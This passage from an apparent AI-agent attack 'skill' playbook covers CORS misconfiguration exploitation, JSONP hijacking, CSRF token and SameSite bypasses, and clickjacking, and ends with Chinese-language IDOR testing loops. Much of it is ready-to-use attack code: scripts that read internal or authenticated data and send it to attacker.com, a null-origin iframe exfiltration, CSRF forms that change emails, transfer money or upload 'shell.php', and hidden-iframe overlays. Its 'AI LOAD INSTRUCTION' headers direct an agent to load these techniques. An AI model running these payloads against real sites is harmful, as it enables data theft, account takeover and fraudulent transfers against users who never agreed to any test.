https://target.com → https://ⓣarget.com (Unicode homoglyph)
```

Some origin validators normalize Unicode after comparison, while the browser sends the original — or vice versa.

---

## 9. INTERNAL NETWORK CORS EXPLOITATION

### Scenario

An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:
```http
Access-Control-Allow-Origin: *
```

Internal APIs often use wildcard CORS because "only internal users can reach it."

### Attack chain

```text
1. Attacker sends victim (internal employee) a link to attacker.com
2. Attacker page JavaScript fetches internal API:
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS allows * → response readable
4. Exfiltrate internal data to attacker server
```

```javascript
// On attacker.com — target internal API from victim's browser
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### Port scanning via CORS timing

Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:
- **Port open**: connection established → CORS error (different timing)
- **Port closed**: connection refused → fast error
- **Host down**: timeout → slow error

### Combined with DNS rebinding

```text
1. Attacker controls attacker.com with short TTL (e.g., 0 or 1)
2. First DNS resolution: attacker.com → attacker's IP (serves malicious JS)
3. Second DNS resolution: attacker.com → 192.168.1.100 (internal IP)
4. JavaScript on the page fetches attacker.com/admin → now hits internal server
5. Same-origin policy satisfied (same domain) → response readable
```

---
# Part 4: CORS Scenarios


## 1. JSONP Hijacking — Complete Attack Scenario

### Mechanism

JSONP (JSON with Padding) wraps JSON data in a function call, enabling cross-origin data access via `<script>` tags. If the JSONP endpoint returns sensitive data and doesn't validate the Referer/Origin:

```html
<!-- Attacker's page: -->
<script>
function stolen(data) {
    // data contains victim's sensitive information
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="https://target.com/api/userinfo?callback=stolen"></script>
<!-- Victim's browser sends cookies → authenticated request → JSONP returns stolen({"name":"victim","email":"..."}) -->
```

### Watering Hole Attack via JSONP

```text
1. Attacker compromises or creates a popular website (watering hole)
2. Embeds JSONP requests to target sites:
   <script src="https://social-site.com/api/profile?callback=exfil"></script>
   <script src="https://bank-site.com/api/account?callback=exfil"></script>
3. When victim visits the watering hole:
   → Browser sends authenticated requests to social-site and bank-site
   → JSONP responses contain victim's data
   → exfil() function sends data to attacker
```

### Honeypot De-Anonymization via JSONP

Security teams use JSONP to identify anonymous visitors:

```html
<!-- Honeypot page includes JSONP from social platforms: -->
<script src="https://weibo.com/api/user?callback=identify"></script>
<script src="https://github.com/api/user?callback=identify"></script>
<!-- If visitor is logged in → JSONP returns their profile → de-anonymized -->
```


## 2. Same-Origin Policy — Deep Dive

### Definition

Two URLs have the same origin if and only if protocol, hostname, and port all match:

| URL A | URL B | Same Origin? | Reason |
|---|---|---|---|
| `http://a.com/p1` | `http://a.com/p2` | YES | Same protocol, host, port |
| `http://a.com` | `https://a.com` | NO | Different protocol |
| `http://a.com` | `http://b.com` | NO | Different hostname |
| `http://a.com` | `http://a.com:8080` | NO | Different port |
| `http://a.com` | `http://sub.a.com` | NO | Different hostname |

### document.domain Relaxation

Both pages can set `document.domain = "a.com"` to enable cross-subdomain communication:

```javascript
// On sub1.a.com:
document.domain = "a.com";
// On sub2.a.com:
document.domain = "a.com";
// Now they can access each other's DOM
```

**Security risk**: if any subdomain has XSS, it can set `document.domain` and access all other subdomains that do the same.

---

## 3. CORS vs JSONP — Technical Comparison

| Aspect | JSONP | CORS |
|---|---|---|
| Mechanism | `<script>` tag, callback function | `Access-Control-Allow-Origin` header |
| HTTP methods | GET only | Any method (with preflight for non-simple) |
| Data format | Wrapped in function call | Native JSON/XML/etc. |
| Error handling | No (script either loads or fails) | Yes (fetch API catches errors) |
| Security control | Referer/callback validation | Origin header + server whitelist |
| Browser support | All (legacy) | Modern (IE10+) |
| Credential handling | Always sends cookies | Only with `credentials: include` + server allow |

**Migration path**: replace JSONP endpoints with proper CORS configuration.

---

## 4. CORS Exploitation Payloads

### Read Authenticated Data (reflected origin)

```javascript
// If server reflects any Origin in Access-Control-Allow-Origin:
fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'  // sends cookies
})
.then(r => r.json())
.then(data => {
    // Exfiltrate:
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### Null Origin Exploit (sandbox)

```html
<!-- Create null origin via sandboxed iframe: -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/data', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://attacker.com/c?d='+btoa(d)));
</script>
"></iframe>
<!-- Origin header sent as: null -->
<!-- If server allows Access-Control-Allow-Origin: null → exploitable -->
```

---

## 5. Dual-Site Attack Lab Pattern

Testing JSONP hijacking or CORS with two local servers:

```text
Server A (target): localhost:8981 — login page, authenticated API with JSONP
Server B (attacker): localhost:8982 — hosts attack page with JSONP/CORS exploit

Attack flow:
1. Victim logs into Server A (gets session cookie)
2. Victim visits Server B (attacker page)
3. Server B's page includes <script src="http://localhost:8981/api/userinfo?callback=steal">
4. Browser sends Server A's cookies → authenticated JSONP response
5. steal() function on Server B captures the data

Note: for non-localhost testing, change the attack page's target URLs accordingly.
```


---
# Part 5: CSRF


# SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert CSRF techniques. Covers modern bypass vectors (SameSite gaps, custom header flaws, tokenless bypass patterns), JSON CSRF, multipart CSRF, chaining with XSS. Base models often present only basic CSRF without covering SameSite edge cases and common broken token implementations.

## 0. RELATED ROUTING

Also load:

- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when JSON endpoints become readable cross-origin
- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when login, account linking, or callback binding relies on OAuth state


## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ Check CORS policy: does Access-Control-Allow-Credentials: true appear?
   With wildcard or attacker origin? → exploitable JSON CSRF
□ Check OAuth flows for missing state parameter
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```


---
# Part 6: Clickjacking


# SKILL: Clickjacking — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Clickjacking (UI redress) techniques. Covers iframe transparency tricks, X-Frame-Options bypass, CSP frame-ancestors, multi-step clickjacking, drag-and-drop attacks, and chaining with other vulnerabilities. Often a "low severity" finding that becomes critical when targeting admin actions.

## 1. CORE CONCEPT

Clickjacking loads a target page in a transparent iframe overlaid on an attacker's page. The victim sees the attacker's UI but clicks on the invisible target page, performing unintended actions.

```html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }
</style>
<div class="decoy"><button>Click to win a prize!</button></div>
<iframe src="https://target.com/account/delete?confirm=yes"></iframe>
```


## 2. DETECTION — IS THE PAGE FRAMEABLE?

### Check X-Frame-Options Header

```
X-Frame-Options: DENY           → cannot be framed (secure)
X-Frame-Options: SAMEORIGIN     → only same-origin framing (secure for cross-origin)
X-Frame-Options: ALLOW-FROM uri → deprecated, browser support inconsistent
(header absent)                  → frameable! (vulnerable)
```

### Check CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none'        → cannot be framed
Content-Security-Policy: frame-ancestors 'self'         → same-origin only
Content-Security-Policy: frame-ancestors https://a.com  → specific origin
(directive absent)                                       → frameable
```

**CSP frame-ancestors supersedes X-Frame-Options** in modern browsers.

### Quick PoC Test

```html
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
```

If the page loads in the iframe → frameable → potentially vulnerable.

### JavaScript Frame Detection (from target page source)

```javascript
// Common frame-busting code found in target pages:
if (top.location.hostname !== self.location.hostname) {
    top.location.href = self.location.href;
}
```

If this code is present but not using CSP `frame-ancestors`, it can often be bypassed.

---

## 3. PROOF OF CONCEPT TEMPLATES

### Basic Single-Click

```html
<html>
<head><title>Free Prize</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
</style>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
</body>
</html>
```

### Multi-Step Clickjacking

For actions requiring multiple clicks (e.g., "Are you sure?" confirmation):

```html
<div id="step1">
  <button onclick="document.getElementById('step1').style.display='none';
                    document.getElementById('step2').style.display='block';">
    Step 1: Click here
  </button>
</div>
<div id="step2" style="display:none">
  <button>Step 2: Confirm</button>
</div>
<iframe src="https://target.com/admin/action"></iframe>
```

Reposition iframe for each step to align the transparent button with the decoy.

### Drag-and-Drop Clickjacking

Extract data from one iframe to another using HTML5 drag-and-drop events — the victim drags across invisible iframes, transferring tokens or data.

---

## 4. BYPASS TECHNIQUES

### Frame-Busting Script Bypass

Some pages use JavaScript frame-busting:
```javascript
if (top !== self) { top.location = self.location; }
```

**Bypass with sandbox attribute**:
```html
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox without allow-top-navigation prevents frame-busting -->
```

### X-Frame-Options ALLOW-FROM Bypass

`ALLOW-FROM` is not supported in Chrome/Safari. If the server relies solely on `ALLOW-FROM`, modern browsers ignore it → page is frameable.

### Double-Framing

If `X-Frame-Options: SAMEORIGIN` is set, but a same-origin page exists that can be framed (without XFO), use that page as an intermediary to frame the target.

---

## 5. HIGH-IMPACT TARGETS

```text
Account deletion page
Email/password change form
Admin panel actions (add user, change role)
Payment confirmation
OAuth authorization ("Allow" button)
Two-factor authentication disable
API key generation
Webhook configuration
```

---

## 6. TESTING CHECKLIST

```
□ Check X-Frame-Options header on sensitive pages
□ Check CSP frame-ancestors directive
□ Create iframe PoC and verify page loads
□ Test frame-busting scripts — try sandbox attribute bypass
□ Identify high-value single-click actions
□ For multi-step actions, build multi-click PoC
□ Test both authenticated and unauthenticated pages
□ Verify ALLOW-FROM behavior across browsers
```

---

## IDOR 必做闭环（不止是可选方向——多数站点的核心风险在越权）

若未测面存在对象级端点（订单详情/地址/用户资料等），按以下闭环**完整跑**，跳步不算测过：

1. **建双账号**：找到登录/注册接口，分别取得 userA、userB 的会话凭证
   （存 evidence/cookies.txt，命令里引用文件，不裸拼长串）
2. **对象枚举**：userB 登录取一个真实对象（如 order?id=8823 返回 B 的手机号 139…）
3. **身份对调**：换 userA 凭证重放同一请求 → 响应里 B 的标记是否还在？
   → 还在 = 越权成立，立即写 evidence+发现上报
4. **写操作同法**：userA 改 B 的地址 → 用读接口复查值真的变了（读回验证）
5. **响应 diff**：A/B 凭证两次响应逐字段比——差异字段才是发现，相同部分不算

## 攻击闭环四步（每个候选对象端点跑全）

1. **对象枚举**：相邻 ID/时间戳/UUID 的可预测性——连续取 3 个样本看规律
2. **身份对调**：A 的身份访问 B 的对象（A/B 凭证见 evidence/cookies.txt），
   marker 从 B 的正常响应取（手机号/用户名等），换 A 凭证重放看 marker 是否还在
3. **响应 diff**：两次响应逐字段比——差异字段才是发现，相同部分不算
4. **写操作必须读回**：改完立刻用读接口复查值真的变了，才算写入成立
